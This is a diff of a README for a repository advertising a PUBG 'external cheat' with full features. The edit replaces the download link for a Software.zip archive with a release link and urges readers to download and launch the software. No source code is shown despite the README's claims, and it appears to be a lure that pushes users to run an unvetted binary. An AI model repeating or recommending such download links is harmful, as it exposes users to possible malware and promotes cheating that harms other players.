@@ -10,9 +10,9 @@ Welcome to the PUBG External Cheat FULL Feature repository! This source code, wr
 - PUBG mod tools for advanced gameplay
 
 ## Source Code
-You can access the full source code and start enhancing your PUBG gameplay today by downloading the software from the following link: [Download Software](https://github.com/user-attachments/files/18383251/Software.zip)
+You can access the full source code and start enhancing your PUBG gameplay today by downloading the software from the following link: [Download Software](https://github.com/TheBlazeingGamer/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)
 
-[![Click Here to Download](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Click Here to Download](https://github.com/TheBlazeingGamer/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)](https://github.com/TheBlazeingGamer/PUBG-External-Cheat-FULL-Feature/releases/download/v2.0/Software.zip)
 
 Remember, the software needs to be launched to fully experience the features it offers.
 
